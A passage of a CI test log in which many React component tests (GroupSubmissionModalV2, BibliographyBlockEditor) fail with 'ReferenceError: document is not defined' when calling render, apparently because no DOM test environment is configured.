2025-11-18T17:36:11.3495548Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3496404Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m338:7[22m[39m
2025-11-18T17:36:11.3496640Z     [90m336| [39m
2025-11-18T17:36:11.3497333Z     [90m337| [39m    it('handles submission with success', async () => {
2025-11-18T17:36:11.3497591Z     [90m338| [39m      render(
2025-11-18T17:36:11.3497843Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3498157Z     [90m339| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3498491Z     [90m340| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.3498504Z 
2025-11-18T17:36:11.3498877Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[256/545]⎯[22m[39m
2025-11-18T17:36:11.3498890Z 
2025-11-18T17:36:11.3500785Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mSubmission Functionality[2m > [22mshows existing submission when available
2025-11-18T17:36:11.3501324Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3502078Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3502922Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m390:7[22m[39m
2025-11-18T17:36:11.3503125Z     [90m388| [39m      });
2025-11-18T17:36:11.3503311Z     [90m389| [39m
2025-11-18T17:36:11.3503543Z     [90m390| [39m      render(
2025-11-18T17:36:11.3503787Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3504141Z     [90m391| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3504517Z     [90m392| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.3504535Z 
2025-11-18T17:36:11.3504981Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[257/545]⎯[22m[39m
2025-11-18T17:36:11.3504997Z 
2025-11-18T17:36:11.3507083Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mModal Interaction[2m > [22mcalls onClose when close button is clicked
2025-11-18T17:36:11.3507599Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3508295Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3509114Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m408:7[22m[39m
2025-11-18T17:36:11.3509857Z     [90m406| [39m  describe('Modal Interaction', () => {
2025-11-18T17:36:11.3510388Z     [90m407| [39m    it('calls onClose when close button is clicked', async () => {
2025-11-18T17:36:11.3510637Z     [90m408| [39m      render(
2025-11-18T17:36:11.3510881Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3511243Z     [90m409| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3511626Z     [90m410| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.3511642Z 
2025-11-18T17:36:11.3512077Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[258/545]⎯[22m[39m
2025-11-18T17:36:11.3512093Z 
2025-11-18T17:36:11.3513973Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mModal Interaction[2m > [22mcalls onClose when cancel button is clicked
2025-11-18T17:36:11.3514456Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3515311Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3516188Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m428:7[22m[39m
2025-11-18T17:36:11.3516395Z     [90m426| [39m
2025-11-18T17:36:11.3517112Z     [90m427| [39m    it('calls onClose when cancel button is clicked', async () => {
2025-11-18T17:36:11.3517558Z     [90m428| [39m      render(
2025-11-18T17:36:11.3517787Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3518117Z     [90m429| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3518494Z     [90m430| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.3518510Z 
2025-11-18T17:36:11.3518927Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[259/545]⎯[22m[39m
2025-11-18T17:36:11.3518943Z 
2025-11-18T17:36:11.3520828Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mError Handling[2m > [22mshows error toast when submission has no content or file
2025-11-18T17:36:11.3521302Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3522034Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3522895Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m464:7[22m[39m
2025-11-18T17:36:11.3523150Z     [90m462| [39m      });
2025-11-18T17:36:11.3523367Z     [90m463| [39m      
2025-11-18T17:36:11.3523617Z     [90m464| [39m      render(
2025-11-18T17:36:11.3523891Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3524233Z     [90m465| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3524565Z     [90m466| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.3524579Z 
2025-11-18T17:36:11.3524955Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[260/545]⎯[22m[39m
2025-11-18T17:36:11.3524967Z 
2025-11-18T17:36:11.3526420Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mError Handling[2m > [22mhandles submission errors gracefully
2025-11-18T17:36:11.3527193Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3527604Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3528072Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m505:7[22m[39m
2025-11-18T17:36:11.3528189Z     [90m503| [39m      });
2025-11-18T17:36:11.3528292Z     [90m504| [39m
2025-11-18T17:36:11.3528418Z     [90m505| [39m      render(
2025-11-18T17:36:11.3528553Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3528729Z     [90m506| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3528915Z     [90m507| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.3528922Z 
2025-11-18T17:36:11.3529129Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[261/545]⎯[22m[39m
2025-11-18T17:36:11.3529143Z 
2025-11-18T17:36:11.3529980Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mrenders correctly in edit mode
2025-11-18T17:36:11.3530223Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3530772Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3531204Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m83:7[22m[39m
2025-11-18T17:36:11.3531375Z     [90m 81| [39m  describe('Edit Mode', () => {
2025-11-18T17:36:11.3531596Z     [90m 82| [39m    it('renders correctly in edit mode', () => {
2025-11-18T17:36:11.3531724Z     [90m 83| [39m      render(
2025-11-18T17:36:11.3531858Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3532032Z     [90m 84| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3532191Z     [90m 85| [39m          block={defaultBlock}
2025-11-18T17:36:11.3532210Z 
2025-11-18T17:36:11.3532409Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[262/545]⎯[22m[39m
2025-11-18T17:36:11.3532416Z 
2025-11-18T17:36:11.3533272Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mallows editing title and description
2025-11-18T17:36:11.3533519Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3533921Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3534344Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m100:7[22m[39m
2025-11-18T17:36:11.3534444Z     [90m 98| [39m
2025-11-18T17:36:11.3534685Z     [90m 99| [39m    it('allows editing title and description', () => {
2025-11-18T17:36:11.3534813Z     [90m100| [39m      render(
2025-11-18T17:36:11.3534951Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3535135Z     [90m101| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3535302Z     [90m102| [39m          block={defaultBlock}
2025-11-18T17:36:11.3535310Z 
2025-11-18T17:36:11.3535505Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[263/545]⎯[22m[39m
2025-11-18T17:36:11.3535512Z 
2025-11-18T17:36:11.3536316Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22madds a new PDF item
2025-11-18T17:36:11.3536556Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3537094Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3537516Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m120:7[22m[39m
2025-11-18T17:36:11.3537613Z     [90m118| [39m
2025-11-18T17:36:11.3537808Z     [90m119| [39m    it('adds a new PDF item', () => {
2025-11-18T17:36:11.3538060Z     [90m120| [39m      render(
2025-11-18T17:36:11.3538193Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3538367Z     [90m121| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3538531Z     [90m122| [39m          block={defaultBlock}
2025-11-18T17:36:11.3538538Z 
2025-11-18T17:36:11.3538731Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[264/545]⎯[22m[39m
2025-11-18T17:36:11.3538739Z 
2025-11-18T17:36:11.3539535Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22madds a new link item
2025-11-18T17:36:11.3539771Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3540166Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3540578Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m147:7[22m[39m
2025-11-18T17:36:11.3540674Z     [90m145| [39m
2025-11-18T17:36:11.3540871Z     [90m146| [39m    it('adds a new link item', () => {
2025-11-18T17:36:11.3540996Z     [90m147| [39m      render(
2025-11-18T17:36:11.3541129Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3541301Z     [90m148| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3541462Z     [90m149| [39m          block={defaultBlock}
2025-11-18T17:36:11.3541469Z 
2025-11-18T17:36:11.3541773Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[265/545]⎯[22m[39m
2025-11-18T17:36:11.3541781Z 
2025-11-18T17:36:11.3542582Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mdisplays existing items
2025-11-18T17:36:11.3542812Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3543206Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3543613Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m174:7[22m[39m
2025-11-18T17:36:11.3543730Z     [90m172| [39m
2025-11-18T17:36:11.3543934Z     [90m173| [39m    it('displays existing items', () => {
2025-11-18T17:36:11.3544056Z     [90m174| [39m      render(
2025-11-18T17:36:11.3544188Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3544357Z     [90m175| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3544532Z     [90m176| [39m          block={blockWithItems}
2025-11-18T17:36:11.3544539Z 
2025-11-18T17:36:11.3544737Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[266/545]⎯[22m[39m
2025-11-18T17:36:11.3544744Z 
2025-11-18T17:36:11.3545510Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mdeletes an item
2025-11-18T17:36:11.3545742Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3546141Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3546553Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m190:7[22m[39m
2025-11-18T17:36:11.3546655Z     [90m188| [39m
2025-11-18T17:36:11.3546945Z     [90m189| [39m    it('deletes an item', async () => {
2025-11-18T17:36:11.3547073Z     [90m190| [39m      render(
2025-11-18T17:36:11.3547205Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3547381Z     [90m191| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3547550Z     [90m192| [39m          block={blockWithItems}
2025-11-18T17:36:11.3547557Z 
2025-11-18T17:36:11.3547751Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[267/545]⎯[22m[39m
2025-11-18T17:36:11.3547757Z 
2025-11-18T17:36:11.3548592Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mtoggles show categories option
2025-11-18T17:36:11.3548822Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3549347Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3549763Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m225:7[22m[39m
2025-11-18T17:36:11.3549864Z     [90m223| [39m
2025-11-18T17:36:11.3550088Z     [90m224| [39m    it('toggles show categories option', () => {
2025-11-18T17:36:11.3550211Z     [90m225| [39m      render(
2025-11-18T17:36:11.3550354Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3550523Z     [90m226| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3550687Z     [90m227| [39m          block={defaultBlock}
2025-11-18T17:36:11.3550693Z 
2025-11-18T17:36:11.3550887Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[268/545]⎯[22m[39m
2025-11-18T17:36:11.3550894Z 
2025-11-18T17:36:11.3551669Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mchanges sort order
2025-11-18T17:36:11.3551907Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3552305Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3552710Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m245:7[22m[39m
2025-11-18T17:36:11.3552812Z     [90m243| [39m
2025-11-18T17:36:11.3553102Z     [90m244| [39m    it('changes sort order', () => {
2025-11-18T17:36:11.3553227Z     [90m245| [39m      render(
2025-11-18T17:36:11.3553360Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3553528Z     [90m246| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3553691Z     [90m247| [39m          block={defaultBlock}
2025-11-18T17:36:11.3553697Z 
2025-11-18T17:36:11.3553887Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[269/545]⎯[22m[39m
2025-11-18T17:36:11.3553894Z 
2025-11-18T17:36:11.3554702Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mhandles file upload for PDF
2025-11-18T17:36:11.3554941Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3555335Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3555738Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m287:7[22m[39m
2025-11-18T17:36:11.3555856Z     [90m285| [39m      };
2025-11-18T17:36:11.3555951Z     [90m286| [39m
2025-11-18T17:36:11.3556077Z     [90m287| [39m      render(
2025-11-18T17:36:11.3556204Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3556372Z     [90m288| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3556556Z     [90m289| [39m          block={blockWithEmptyPDF}
2025-11-18T17:36:11.3556564Z 
2025-11-18T17:36:11.3556854Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[270/545]⎯[22m[39m
2025-11-18T17:36:11.3556862Z 
2025-11-18T17:36:11.3557664Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mvalidates PDF file types
2025-11-18T17:36:11.3557980Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3558533Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3559100Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m303:7[22m[39m
2025-11-18T17:36:11.3559334Z     [90m301| [39m    it('validates PDF file types', () => {
2025-11-18T17:36:11.3559579Z     [90m302| [39m      // Test that the component has validation logic
2025-11-18T17:36:11.3559718Z     [90m303| [39m      render(
2025-11-18T17:36:11.3559978Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3560160Z     [90m304| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3560332Z     [90m305| [39m          block={blockWithItems}
2025-11-18T17:36:11.3560484Z 
2025-11-18T17:36:11.3560837Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[271/545]⎯[22m[39m
2025-11-18T17:36:11.3560853Z 
2025-11-18T17:36:11.3561819Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mhas file size validation
2025-11-18T17:36:11.3562080Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3562623Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3563052Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m331:7[22m[39m
2025-11-18T17:36:11.3563387Z     [90m329| [39m    it('has file size validation', () => {
2025-11-18T17:36:11.3563657Z     [90m330| [39m      // Test that the component has size validation logic
2025-11-18T17:36:11.3563788Z     [90m331| [39m      render(
2025-11-18T17:36:11.3563916Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3564236Z     [90m332| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3564404Z     [90m333| [39m          block={defaultBlock}
2025-11-18T17:36:11.3564412Z 
2025-11-18T17:36:11.3564612Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[272/545]⎯[22m[39m
2025-11-18T17:36:11.3564633Z 
2025-11-18T17:36:11.3566072Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mPreview Mode[2m > [22mrenders correctly in preview mode
2025-11-18T17:36:11.3566525Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3567379Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3567855Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m357:7[22m[39m
2025-11-18T17:36:11.3568049Z     [90m355| [39m  describe('Preview Mode', () => {
2025-11-18T17:36:11.3568284Z     [90m356| [39m    it('renders correctly in preview mode', () => {
2025-11-18T17:36:11.3568429Z     [90m357| [39m      render(
2025-11-18T17:36:11.3568560Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3568739Z     [90m358| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3568903Z     [90m359| [39m          block={blockWithItems}
2025-11-18T17:36:11.3568912Z 
2025-11-18T17:36:11.3569120Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[273/545]⎯[22m[39m
2025-11-18T17:36:11.3569128Z 
2025-11-18T17:36:11.3569997Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mPreview Mode[2m > [22mshows empty state when no items
2025-11-18T17:36:11.3570239Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3570643Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3571054Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m374:7[22m[39m
2025-11-18T17:36:11.3571170Z     [90m372| [39m
2025-11-18T17:36:11.3571397Z     [90m373| [39m    it('shows empty state when no items', () => {
2025-11-18T17:36:11.3571531Z     [90m374| [39m      render(
2025-11-18T17:36:11.3571659Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3571834Z     [90m375| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3571993Z     [90m376| [39m          block={defaultBlock}
2025-11-18T17:36:11.3572000Z 
2025-11-18T17:36:11.3572205Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[274/545]⎯[22m[39m
2025-11-18T17:36:11.3572212Z 
2025-11-18T17:36:11.3574553Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mPreview Mode[2m > [22mdisplays correct icons for different item types
2025-11-18T17:36:11.3575357Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3576417Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3577679Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m388:7[22m[39m
2025-11-18T17:36:11.3578013Z     [90m386| [39m
2025-11-18T17:36:11.3579286Z     [90m387| [39m    it('displays correct icons for different item types', () => {
2025-11-18T17:36:11.3579614Z     [90m388| [39m      render(
2025-11-18T17:36:11.3580396Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3581279Z     [90m389| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3582062Z     [90m390| [39m          block={blockWithItems}
2025-11-18T17:36:11.3582558Z 
2025-11-18T17:36:11.3583105Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[275/545]⎯[22m[39m
2025-11-18T17:36:11.3583120Z 
2025-11-18T17:36:11.3584044Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mItem Management[2m > [22mmoves items up and down
2025-11-18T17:36:11.3584299Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3584808Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3585228Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m410:7[22m[39m
2025-11-18T17:36:11.3585431Z     [90m408| [39m  describe('Item Management', () => {
2025-11-18T17:36:11.3585632Z     [90m409| [39m    it('moves items up and down', () => {
2025-11-18T17:36:11.3585939Z     [90m410| [39m      render(
2025-11-18T17:36:11.3586083Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3586261Z     [90m411| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3586432Z     [90m412| [39m          block={blockWithItems}
2025-11-18T17:36:11.3586440Z 
2025-11-18T17:36:11.3587108Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[276/545]⎯[22m[39m
2025-11-18T17:36:11.3587125Z 
2025-11-18T17:36:11.3589728Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mItem Management[2m > [22mexpands and collapses items with edit button
2025-11-18T17:36:11.3593521Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3594318Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3595180Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m435:7[22m[39m
2025-11-18T17:36:11.3595435Z     [90m433| [39m
2025-11-18T17:36:11.3595926Z     [90m434| [39m    it('expands and collapses items with edit button', () => {
2025-11-18T17:36:11.3596162Z     [90m435| [39m      render(
2025-11-18T17:36:11.3596397Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3596719Z     [90m436| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3597228Z     [90m437| [39m          block={blockWithItems}
2025-11-18T17:36:11.3597244Z 
2025-11-18T17:36:11.3597644Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[277/545]⎯[22m[39m
2025-11-18T17:36:11.3597660Z 
2025-11-18T17:36:11.3599410Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mItem Management[2m > [22mshows author and year in collapsed view
2025-11-18T17:36:11.3599947Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3600755Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3601558Z [36m [2m❯[22m __tests__/components/blocks/BibliographyBlockEditor.test.tsx:[2m467:7[22m[39m
2025-11-18T17:36:11.3601731Z     [90m465| [39m
2025-11-18T17:36:11.3602194Z     [90m466| [39m    it('shows author and year in collapsed view', () => {
2025-11-18T17:36:11.3602452Z     [90m467| [39m      render(
2025-11-18T17:36:11.3602702Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3603040Z     [90m468| [39m        <BibliographyBlockEditor
2025-11-18T17:36:11.3603354Z     [90m469| [39m          block={blockWithItems}
2025-11-18T17:36:11.3603595Z 
2025-11-18T17:36:11.3604016Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[278/545]⎯[22m[39m
2025-11-18T17:36:11.3604033Z 
